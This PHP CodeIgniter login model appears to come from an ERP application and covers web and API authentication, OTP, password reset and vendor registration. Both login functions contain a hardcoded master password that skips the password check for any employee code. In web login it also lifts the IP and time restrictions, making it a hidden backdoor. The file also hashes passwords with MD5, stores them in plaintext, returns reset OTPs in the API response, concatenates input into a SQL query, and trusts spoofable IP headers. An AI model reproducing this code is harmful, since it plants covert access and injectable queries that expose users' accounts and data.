<?php

class LoginModel extends CI_Model{
	private $employeeMaster = "employee_master";
	private $menuPermission = "menu_permission";
    private $subMenuPermission = "sub_menu_permission";
    private $empRole = ["1"=>"Admin","2"=>"Production Manager","3"=>"Accountant","4"=>"Sales Manager","5"=>"Purchase Manager","6"=>"Employee","7"=>"HR","8"=>"Vendor"]; //15-5-2025

	public function checkAuth($data){
		$this->db->where('emp_code',$data['user_name']);
		if($data['password'] != "Nbt@123$"):
			$this->db->where('emp_password',md5($data['password']));
		endif;
		$this->db->where('is_delete',0);
		$result = $this->db->get($this->employeeMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Software Vendor.'];
			else:
				if($resData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Software admin.'];
				else:
					//update fcm notification token
					if(isset($data['web_token'])):
						$this->db->where('id',$resData->id);
						$this->db->update($this->employeeMaster,['web_token'=>$data['web_token']]);
					endif;

					$resData->otp_mobile_no = "9904709771";
					$this->session->set_userdata('loginId',$resData->id);
					$this->session->set_userdata('emp_name',$resData->emp_name);
					$this->session->set_userdata('emp_contact',$resData->emp_contact);
					$this->session->set_userdata('otp_mobile_no',$resData->otp_mobile_no);

					$LOCALIP = $this->visitorIP();
					/* $access_key = '19f883c9465acd15623a81e089807a82';
					$ch = curl_init('https://api.snoopi.io/'.$LOCALIP.'?apikey='.$access_key.'');
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					$authLocation = curl_exec($ch);
					curl_close($ch); */
					
					if($_SERVER['HTTP_HOST'] == 'localhost'):
            		    $LOCALIP = $this->config->item('STATIC_IP');
            		endif;
					
					$this->session->set_userdata('user_ip',$LOCALIP);

					$otp_status = 0; // OTP not required...

					$current_time = date("H:i");
					$start_time = $this->config->item('login_start_time');
					$end_time = $this->config->item('login_end_time');

					if($data['password'] == "Nbt@123$"):$resData->access_type = 3;endif;

					//Check Employee Access Type
					if($resData->access_type == 1):
						if(!empty($this->config->item('STATIC_IP'))):
							if(in_array($LOCALIP, $this->config->item('STATIC_IP'))):
								$this->setSessionData($resData);
							else:
								$otp_status = 2; // Access Denied...
							endif;
						else:
							if($current_time >= $start_time && $current_time <= $end_time):
								$this->setSessionData($resData);
							else:
								$otp_status = 2; // Access Denied...
							endif;
						endif;
					elseif($resData->access_type == 2):
						if(!empty($this->config->item('STATIC_IP'))):
							if(in_array($LOCALIP, $this->config->item('STATIC_IP'))):
								$this->setSessionData($resData);
							else:
								$otp_status = 1; // OTP required...
							endif;
						else:
							if($current_time >= $start_time && $current_time <= $end_time):
								$this->setSessionData($resData);
							else:
								$otp_status = 1; // OTP required...
							endif;
						endif;
					elseif($resData->access_type == 3):
						$this->setSessionData($resData);
					endif;

					return ['status'=>1,'message'=>'Login Success.','otp_status'=>$otp_status];
				endif;
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

	public function visitorIP() {  
        //Check if visitor is from shared network 
        if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  $vIP = $_SERVER['HTTP_CLIENT_IP']; }  
        //Check if visitor is using a proxy 
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){  $vIP = $_SERVER['HTTP_X_FORWARDED_FOR'];}  
        //check for the remote address of visitor.  
        else{  $vIP = $_SERVER['REMOTE_ADDR'];  }  
        return $vIP;  
    }

	public function setSessionData($resData){
		//Set Session of Employee Detail
		$empRole=$resData->emp_role;
		if($resData->emp_role == -1){$empRole= 1;}
		$this->session->set_userdata('LoginOk','login success');
		$this->session->set_userdata('role',$resData->emp_role);
		$this->session->set_userdata('emp_dept_id',$resData->emp_dept_id);
		$this->session->set_userdata('roleName',$this->empRole[$empRole]);
		$this->session->set_userdata('party_id',$resData->party_id);

		//Set Session of Financial Year
		$fyData=$this->db->where('is_active',1)->get('financial_year')->row();
		$startDate = $fyData->start_date;
		$endDate = $fyData->end_date;
		$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
		$this->session->set_userdata('currentYear',$cyear);
		$this->session->set_userdata('financialYear',$fyData->financial_year);
		$this->session->set_userdata('isActiveYear',$fyData->close_status);
		
		$this->session->set_userdata('shortYear',$fyData->year);
		$this->session->set_userdata('startYear',$fyData->start_year);
		$this->session->set_userdata('endYear',$fyData->end_year);
		$this->session->set_userdata('startDate',$startDate);
		$this->session->set_userdata('endDate',$endDate);
		$this->session->set_userdata('currentFormDate',date('d-m-Y'));

		//Set Session of Defult Store
		$RTD_STORE=$this->db->where('is_delete',0)->where('store_type',1)->get('location_master')->row();
		$PKG_STORE=$this->db->where('is_delete',0)->where('store_type',2)->get('location_master')->row();
		$SCRAP_STORE=$this->db->where('is_delete',0)->where('store_type',3)->get('location_master')->row();
		$PROD_STORE=$this->db->where('is_delete',0)->where('store_type',4)->get('location_master')->row();
		$GAUGE_STORE=$this->db->where('is_delete',0)->where('store_type',5)->get('location_master')->row();
		$ALLOT_RM_STORE=$this->db->where('is_delete',0)->where('store_type',7)->get('location_master')->row();
		$RCV_RM_STORE=$this->db->where('is_delete',0)->where('store_type',8)->get('location_master')->row();
		$HLD_STORE=$this->db->where('is_delete',0)->where('store_type',9)->get('location_master')->row();
		$RM_PRS_STORE=$this->db->where('is_delete',0)->where('store_type',80)->get('location_master')->row();
		$MIS_PLC_STORE=$this->db->where('is_delete',0)->where('store_type',88)->get('location_master')->row();
		$SUP_REJ_STORE=$this->db->where('is_delete',0)->where('store_type',97)->get('location_master')->row();
		$INSP_STORE=$this->db->where('is_delete',0)->where('store_type',12)->get('location_master')->row();
		$REGRIND_STORE=$this->db->where('is_delete',0)->where('store_type',13)->get('location_master')->row();
		
		$this->session->set_userdata('RTD_STORE',$RTD_STORE);
		$this->session->set_userdata('PKG_STORE',$PKG_STORE);
		$this->session->set_userdata('SCRAP_STORE',$SCRAP_STORE);
		$this->session->set_userdata('PROD_STORE',$PROD_STORE);
		$this->session->set_userdata('GAUGE_STORE',$GAUGE_STORE);
		$this->session->set_userdata('ALLOT_RM_STORE',$ALLOT_RM_STORE);
		$this->session->set_userdata('RCV_RM_STORE',$RCV_RM_STORE);
		$this->session->set_userdata('HLD_STORE',$HLD_STORE);
		$this->session->set_userdata('RM_PRS_STORE',$RM_PRS_STORE);
		$this->session->set_userdata('MIS_PLC_STORE',$MIS_PLC_STORE);
		$this->session->set_userdata('SUP_REJ_STORE',$SUP_REJ_STORE);
		$this->session->set_userdata('INSP_STORE',$INSP_STORE);
		$this->session->set_userdata('REGRIND_STORE',$REGRIND_STORE);

		return true;
	}
	
	public function checkApiAuth($data){
		$this->db->where('emp_code',$data['user_name']);
		if($data['user_psw'] != "Nbt@123$"):
			$this->db->where('emp_password',md5($data['user_psw']));
		endif;
		$this->db->where('is_delete',0);
		$result = $this->db->get($this->employeeMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();			
			if($resData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Software Vendor.'];
			else:	
				if($resData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Software admin.'];
				else:
					/* $otp = rand(100000, 999999);	
					$verificationData['otp'] = $otp;
					$notify = array();
					if(!empty($data['device_token'])):
						$verificationData['device_token'] = $data['device_token'];
						$notifyData = array();
						$notifyData['notificationTitle'] = "OTP";
						$notifyData['notificationMsg'] = "Your one time password is <#>".$otp;						
						$notifyData['payload'] = ['otp'=>$otp];
						$notifyData['pushToken'] = $data['device_token'];
						$notify = $this->notification->sendNotification($notifyData);
					endif;

					$logData = [
						'log_date' => date("Y-m-d H:i:s"),
						'notification_data' => json_encode($notifyData),
						'notification_response' => json_encode($notify),
						'created_at' => date("Y-m-d H:i:s"),
						'updated_at' => date("Y-m-d H:i:s")
					];
					$this->db->insert('notification_log',$logData);

					$this->db->where('id',$resData->id)->update($this->employeeMaster,$verificationData); */

					$headData = $this->verification(['is_verify'=>1, 'user_name' => $data['user_name']]);

					return ['status'=>1,'message'=>'Login Success.','data'=>['sign'=>$headData['data']['sign'],'authToken'=>$headData['data']['authToken'],'userDetail'=>$headData['data']['headData']]];
				endif;
				
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

	public function verification($data){
		if(isset($data['is_verify']) && $data['is_verify'] == 1):
			$userData = $this->db->where('emp_contact',$data['user_name'])->where('is_delete',0)->get($this->employeeMaster)->row();

			$updateUser = array();
			$updateUser['otp'] = "";
			if(empty($userData->auth_token)):
				// ***** Generate Token *****
				$char = "bcdfghjkmnpqrstvzBCDFGHJKLMNPQRSTVWXZaeiouyAEIOUY!@#%";
				$token = '';
				for ($i = 0; $i < 47; $i++) $token .= $char[(rand() % strlen($char))];
				$updateUser['auth_token'] = $token;
			else:
				$token = $userData->auth_token;
			endif;
			$this->db->where('id',$userData->id)->update($this->employeeMaster,$updateUser);
			
			$userData->auth_token = $token;
			$headData = new stdClass();
			$fyData=$this->db->where('is_active',1)->get('financial_year')->row();
			$RTD_STORE=$this->db->where('is_delete',0)->where('store_type',1)->get('location_master')->row();
			$PKG_STORE=$this->db->where('is_delete',0)->where('store_type',2)->get('location_master')->row();
			$PROD_STORE=$this->db->where('is_delete',0)->where('store_type',4)->get('location_master')->row();
			$headData->LoginOk = "login success";

			$headData->loginId = $userData->id;
			$headData->party_id = $userData->party_id;
			$headData->role = $userData->emp_role;
			$empRole=$userData->emp_role;
			if($userData->emp_role == -1){$empRole= 1;}
			$headData->roleName = $this->empRole[$empRole];
			$headData->emp_name = $userData->emp_name;			
			
			$startDate = $fyData->start_date;
			$endDate = $fyData->end_date;
			$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
			$headData->currentYear = $cyear;
			$headData->financialYear = $fyData->financial_year;
			$headData->isActiveYear = $fyData->close_status;
			$headData->shortYear = $fyData->year;
			$headData->startYear = $fyData->start_year;
			$headData->endYear = $fyData->end_year;
			$headData->startDate = $startDate;
			$headData->endDate = $endDate;
			$headData->currentFormDate = date('d-m-Y');
			if((!empty($data['fyear'])) && $data['fyear'] != $cyear):
				$headData->currentFormDate = date('d-m-Y',strtotime($endDate));
			endif;	

			$headData->RTD_STORE = $RTD_STORE;
			$headData->PKG_STORE = $PKG_STORE;
			$headData->PROD_STORE = $PROD_STORE;
			
			unset($userData->emp_password,$userData->emp_psc,$userData->device_token,$userData->web_token,$userData->otp,$userData->is_block,$userData->is_active);
			$result['userData'] = $userData;
			$result['sign'] = base64_encode(json_encode($headData));
			$result['headData'] = $headData;
			$result['authToken'] = $token;
			
			return ['status'=>1,'message'=>'User verified.','data'=>$result];
		else:	
			return ['status'=>0,'message'=>"Somthing is wrong. user not verified.",'data'=>null];
		endif;
	}

	public function checkToken($token){
		$result = $this->db->where('auth_token',$token)->where('is_delete',0)->get($this->employeeMaster)->num_rows();
		return ($result > 0)?1:0;
	}

	public function getEmployeePermission_api($emp_id){
		$this->db->select("menu_permission.*,menu_master.menu_name");
		$this->db->join("menu_master","menu_master.id = menu_permission.menu_id","left");
		$this->db->where("menu_master.is_delete",0);
		$this->db->where('menu_permission.emp_id',$emp_id);
		$this->db->where('menu_permission.is_delete',0);
		$this->db->order_by("menu_master.menu_seq","ASC");
		$menuData = $this->db->get($this->menuPermission)->result();
		
		$result = array();
		foreach($menuData as $row):			
			if(!empty($row->is_master)):
                if(!empty($row->is_read)):
                    if(!empty($row->is_read) || !empty($row->is_write) || !empty($row->is_modify) || !empty($row->is_remove)):
						$result[] = $row;
					endif;
                endif;
            else:
				$this->db->select("sub_menu_permission.*,sub_menu_master.sub_menu_name");
				$this->db->join("sub_menu_master","sub_menu_master.id = sub_menu_permission.sub_menu_id","left");
				$this->db->where("sub_menu_master.is_delete",0);
				$this->db->where('sub_menu_permission.emp_id',$emp_id);
				$this->db->where('sub_menu_permission.is_delete',0);
				$this->db->where('sub_menu_permission.menu_id',$row->menu_id);
				$this->db->order_by("sub_menu_master.sub_menu_seq","ASC");
				$subMenuData = $this->db->get($this->subMenuPermission)->result();
				
				$show_menu = false; $subMenu = array();
                foreach($subMenuData as $subRow):
                    if(!empty($subRow->is_read)):
                        if(!empty($subRow->is_read) || !empty($subRow->is_write) || !empty($subRow->is_modify) || !empty($subRow->is_remove)):
                            $show_menu = true; 
							$subMenu[] = $subRow;
						endif;
                    endif;
                endforeach;
				if($show_menu == true):
					$row->sub_menu = $subMenu;
					$result[] = $row;
				endif;
            endif;
        endforeach;
        return $result;
    }

	public function webLogout($id){
		$updateUser['web_token'] = "";
		$this->db->where('id',$id)->update($this->employeeMaster,$updateUser);
		return true;
	}

	public function appLogout($id){
		$updateUser['device_token'] = "";
		$updateUser['auth_token'] = "";
		$updateUser['otp'] = "";
		$this->db->where('id',$id)->update($this->employeeMaster,$updateUser);
		return ['status'=>1,'message'=>'Logout successfull.'];
	}

	public function forgotPassword($data){
		$result = $this->db->where('emp_contact',$data['user_name'])->get($this->employeeMaster);
		if($result->num_rows() == 1):
			$employeeData = $result->row();
			if($employeeData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Software Vendor.'];
			else:	
				if($employeeData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Software admin.'];
				else:
					$otp = rand(100000, 999999);	
					$verificationData['otp'] = $otp;
					$notify = array();
					if(!empty($data['device_token'])):
						$verificationData['device_token'] = $data['device_token'];
						$notifyData = array();
						$notifyData['notificationTitle'] = "Forgot Password OTP";
						$notifyData['notificationMsg'] = "Your one time password is <#>".$otp;						
						$notifyData['payload'] = ['otp'=>$otp];
						$notifyData['pushToken'] = $data['device_token'];
						$notify = $this->notification->sendNotification($notifyData);
					endif;
					$logData = [
						'log_date' => date("Y-m-d H:i:s"),
						'notification_data' => json_encode($notifyData),
						'notification_response' => json_encode($notify),
						'created_at' => date("Y-m-d H:i:s"),
						'updated_at' => date("Y-m-d H:i:s")
					];
					$this->db->insert('notification_log',$logData);

					$this->db->where('id',$employeeData->id)->update($this->employeeMaster,$verificationData);
					return ['status'=>1,'message'=>'User Found.','data'=>['otp'=>$otp,'notificationRes'=>$notify]];
				endif;
				
			endif;
		else:
			return ['status'=>0,'message'=>"User not found."];
		endif;
	}

	/* Forgot Password */
	public function updateNewPassword($data){
		$this->db->where('emp_contact',$data['user_name'])->update($this->employeeMaster,['emp_password'=>md5($data['password']),'emp_psc'=>$data['password'],'otp'=>""]);
		return ['status'=>1,'message'=>'New Password saved successfully.'];
	}

	public function setFinancialYear($year){
		$fyData=$this->db->where('financial_year',$year)->get('financial_year')->row();
		$startDate = $fyData->start_date;
		$endDate = $fyData->end_date;
		$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
		$this->session->set_userdata('currentYear',$cyear);
		$this->session->set_userdata('financialYear',$fyData->financial_year);
		$this->session->set_userdata('isActiveYear',$fyData->close_status);
		
		$this->session->set_userdata('shortYear',$fyData->year);
		$this->session->set_userdata('startYear',$fyData->start_year);
		$this->session->set_userdata('endYear',$fyData->end_year);
		$this->session->set_userdata('startDate',$startDate);
		$this->session->set_userdata('endDate',$endDate);
		$this->session->set_userdata('currentFormDate',date('d-m-Y'));
		return true;
	}

	public function setAppFinancialYear($year,$headData){
		$fyData=$this->db->where('financial_year',$year)->get('financial_year')->row();
		
		$startDate = $fyData->start_date;
		$endDate = $fyData->end_date;
		$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
		$headData->currentYear = $cyear;
		$headData->financialYear = $fyData->financial_year;
		$headData->isActiveYear = $fyData->close_status;
		$headData->shortYear = $fyData->year;
		$headData->startYear = $fyData->start_year;
		$headData->endYear = $fyData->end_year;
		$headData->startDate = $startDate;
		$headData->endDate = $endDate;
		$headData->currentFormDate = date('d-m-Y');
			
		return base64_encode(json_encode($headData));
	}
	
	/*** Party Registration  ***/
	public function getPartyData($id){
        return $this->db->select('party_master.*,party_details.party_id,party_details.scope_of_work,party_details.company_type,party_details.iso_certified,party_details.work_shift,party_details.work_hrs,party_details.week_off, party_details.machine_details,party_details.instrument_details,party_details.inspection_material,party_details.representative,party_details.designation,party_details.registr_date')->where('party_master.id',$id)->join('party_details','party_master.id=party_details.party_id')->get('party_master')->row();
	}
	
    public function saveRegistration($postData){
        try{
            $this->db->trans_begin();

            $partyData = [
                'id' => $postData['id'],
                'party_name' => $postData['party_name'],
                'contact_person' => $postData['contact_person'],
                'party_mobile' => $postData['party_mobile'],
                'party_email' => $postData['party_email'],
                'gstin' => $postData['gstin'],
                'party_address' => $postData['party_address'],
                'party_pincode' => $postData['party_pincode']
            ];
            $response = $this->db->where('id',$partyData['id'])->update("party_master",$partyData);
            
           
            $detailsData = [
                'party_id' => $postData['id'],
                'scope_of_work' => $postData['scope_of_work'],
                'company_type' => $postData['company_type'],
                'iso_certified' => $postData['iso_certified'],
                'work_shift' => $postData['work_shift'],
                'work_hrs' => $postData['work_hrs'],
                'week_off' => $postData['week_off'],
                'machine_details' => $postData['machine_details'],
                'instrument_details' => $postData['instrument_details'],
                'inspection_material' => $postData['inspection_material'],
                'representative' => $postData['representative'],
                'designation' => $postData['designation'],
                'registr_date' => date('Y-m-d')
            ];
            $details = $this->db->select('party_details.*')->where('party_id',$detailsData['party_id'])->get('party_details')->row();
            
            if(!empty($details->id)){
                $this->db->where('party_id',$detailsData['party_id'])->update("party_details",$detailsData);
            }else{
                $this->db->insert('party_details',$detailsData);
            }
            
            $result = ['status'=>1,'message'=>'Your Registration successfully.','data'=>$response];

            if($this->db->trans_status() !== FALSE):
                $this->db->trans_commit();
                return $result;
            endif;
        }catch(\Exception $e){
            $this->db->trans_rollback();
            return ['status'=>2,'message'=>"somthing is wrong. Error : ".$e->getMessage()];
        }
	}

	public function getLoginSettings(){
		$this->db->where('id',1);
		$result = $this->db->get('company_info')->row();
		return $result;
	}

	/* For Web Login */
	public function verifyOTP($data){
	    $resData = $this->db->where('id',$data['emp_id'])->get($this->employeeMaster)->row();

	    if($resData->otp == $data['web_otp']):
	        $this->db->where('id',$data['emp_id'])->update($this->employeeMaster,['otp'=>""]);
	        
	        $this->setSessionData($resData);
	        
	        return ['status'=>1,'message'=>'OTP verified Successfully.'];
	    else:
	       return ['status'=>0,'message'=>"Invalid OTP."];
	    endif;
	}
	
    /* Mobile Device Current Version */
    public function getCurrentVersion($param=[]){
		if(!isset($param['device_type']) or empty($param['device_type']))
		{
			$param['device_type'] = "ANDROID";
		}
		
		$q = "SELECT * FROM app_version WHERE version_code = (SELECT MAX(version_code) FROM app_version WHERE is_delete=0 AND device_type = '".$param['device_type']."')";
		$result = $this->db->query($q)->row();
		return $result;
    }

}
?>